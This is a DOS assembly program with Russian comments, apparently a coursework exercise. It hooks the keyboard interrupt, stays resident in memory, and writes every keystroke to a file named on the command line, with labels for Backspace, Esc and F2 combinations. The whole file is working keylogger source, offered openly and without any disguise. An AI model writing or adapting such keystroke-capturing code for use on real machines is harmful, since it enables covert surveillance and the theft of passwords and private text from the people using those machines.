		.model tiny
		.code
		.386
		
		org	100h 			
  
eic		macro	cond, str     				;Exit if condition is met
		LOCAL	exitMacro, writeError
	                    
		cond	writeError	                    
		jmp		exitMacro
				                    	
writeError:	  
	   	mov		ah, 09h
	   	lea		dx, str
	   	int		21h
	   			
	   	mov		ah, 4Ch
		int		21h       
				
exitMacro:
endm 	 
		 
		     
		     
		     
start:
		mov		ch, 0
		mov		cl, es:[0080h]
		mov		si, 81h
		lea		di, saveFile
		mov		bx, 125
		call	readParam				 
		mov		bx, 5
		lea		di, buff
		call	readParam
		
		cmp		saveFile[0], 0
		eic		je, neParams			
		cmp		buff[0], 0
		eic		jne, tmParams						             		              		          		
		              		           
		jmp	installHandler      	                     
                
          
                
oldInt9		dd	0  ;адрес старого обработчика прерываний

handle		dw	-1	;дискриптор файла (закрыт)                 		                             		               		                      
saveFile	db 	128 dup(0) ;путь к сохраняемому фалу                      		                             
buff		db	5 dup(0)
		                             
writeError	db	"! Can't write", 0Ah, 0Dh, "$"		                  
createError	db	"! Can't create file", 0Ah, 0Dh, "$"
seekError	db	"! Can't seek in file", 0Ah, 0Dh, "$"		   
closeError	db	"! Can't close file", 0Ah, 0Dh, "$"
neParams	db	"! Not enough params$"               
tmParams	db	"! Too many params$" 		           

backspaceStr	db	"[BACKSPACE]"  ;для визуализации комбинации клавиш выводим
backspaceLen	EQU	$ - backspaceStr	        
escStr			db	"[ESC]"
escLen			EQU $ - escStr
f2Str			db	"[F2]"
f2Len			EQU $ - f2Str
f2ShiftStr		db	"[Shift+F2]"
f2ShiftLen		EQU $ - f2ShiftStr
f2AltStr		db	"[Alt+F2]"
f2AltLen		EQU $ - f2AltStr
f2CtrlStr		db	"[Ctrl+F2]"
f2CtrlLen		EQU $ - f2CtrlStr 


 
                              		       

openFile	proc         
			pusha   ;сохранить все регистры в стек
	
			cmp		handle, -1 ;если не равен -1
			jne		exitOpenFile
	
			lea		dx, saveFile		              
			mov		ah, 3Ch ;открытие(создание) файла
			mov		cx, 0      
			int		21h   
			eic		jc, createError			            
			            
			mov		handle, ax
   	
		exitOpenFile:
			popa	;востановить регистры
			ret
endp		openFile
       
     
     
     
     
int9Handler	proc far ;свой обработчик прерываний для клавы
			pushf   ;сохранить все флаги
			call	cs:oldInt9  ;вызываешь функцию старого обработчика прерываний
			pusha
			
			push	ds   ;сохраняем старые значения регистровых сегментов    
			push	es
			push	cs
			pop		ds	       
			       
			cli		; запретить аппаратное прерывание          					
									              
			mov		ah, 01h  ;прочитать символы изз буфера клавы не удаляя его
			int		16h ; вызов прерываний
			jz		exitInt9Handler ;flag zf устанавливается если пусто 
                     
			lea		dx, buff                     
			mov		buff[0], al   ; записываем символ в буфере
			mov		cx, 1  ;количество символов для записи в файл
												            
			cmp		ah, 0Eh  				;Backspace
			jne		notBackspace				
			
			lea		dx, backspaceStr		;адрес backspace			            
			mov		cx, backspaceLen		;количество байт
	
	notBackspace:			
			cmp		ah, 01h   ; скан код ecs
			jne		notEsc
   
   			lea		dx, escStr
   			mov		cx, escLen				;ESC
	notEsc:
			cmp		ah, 3Ch
			jne		notF2	
			
			lea		dx, f2Str
			mov		cx, f2Len				;F2

	notF2:								       
			cmp		ah, 55h
			jne		notF2Shift	
			
			lea		dx, f2ShiftStr
			mov		cx, f2ShiftLen			;F2 + Shift				
	                                    	
	notF2Shift:
			cmp		ah, 5Fh
			jne		notF2Ctrl	
			
			lea		dx, f2CtrlStr
			mov		cx, f2CtrlLen			;F2 + Ctrl		

	notF2Ctrl:
			cmp		ah, 69h
			jne		notF2Alt	
			
			lea		dx, f2AltStr
			mov		cx, f2AltLen			;F2 + Alt				
			                
	notF2Alt:			                
			call	openFile	; пробуем создать файл если не открыт		                   
			                   
			mov		ah, 40h     ;запись в файл          
			mov		bx, handle	;дескриптор в bx
			int		21h
			eic		jc, writeError			

						
		exitInt9Handler:						
			sti   ;разрешить аппаратное прерывание
			pop		es
			pop		ds
			
			popa  ;востановить регистры 
			
			iret    ;выход из прерываний(обработчика)
endp		int9Handler						                                                                                                                                                
         
              
   


  
  
installHandler:      ;установка обработчика прерываний
			mov		ah, 35h ;получить адрес старого обработчика прерываний
			mov		al, 9h 
			int		21h
			
			mov		word ptr oldInt9, bx     ;записываем адрес в переменную
			mov		word ptr oldInt9 + 2, es  ;записываем сегмент 	(первые 2 байта смещение вторые 2 это сегмент)	
			mov		ah, 25h ;установить адрес нового обработчика прерываний
			mov		al, 9h         ;вектор  
			lea		dx, int9Handler
			int		21h     							
			        
			mov		ax, 3100h   ;оставить программу резидентной
			mov		dx, (installHandler - start + 100h) / 16 + 1  ;(размер кода программы + PSP) / (16 ) + 1 во избежании потерь = количестве сегментов
			int		21h								    
			
			
			
			
readParam proc					;Reads param from command line with length CX to ES:[DI] (DS must point to PSP, buffer size in BX)
		push	ax	  			
		push	bx     	          	
	 
	 	jcxz	exitReadParam
	        	      	                  	                  
skipSpaces:
		push	es
		push	di
		mov		ax, ds
		mov		es, ax
		mov		di, si
		
		mov		al, ' '
		repz	scasb	   
		dec		di   
		inc		cx
		mov		si, di  
		
		pop		di
		pop		es
		        
findParamEnd:
		movsb     
		dec		bx
		dec		cx
		cmp		bx, 0
		je		paramEnded
		cmp		byte ptr es:[di - 1], 0Dh
		je		paramEnded
		cmp		byte ptr es:[di - 1], ' '
		jne		findParamEnd
		
paramEnded:	   		
		dec		di    
		mov		byte ptr es:[di], 0
		inc		di

exitReadParam:	  
		pop		bx   
		pop		ax	     		        	
		ret	            	
endp	readParam			
						     
end	start			
			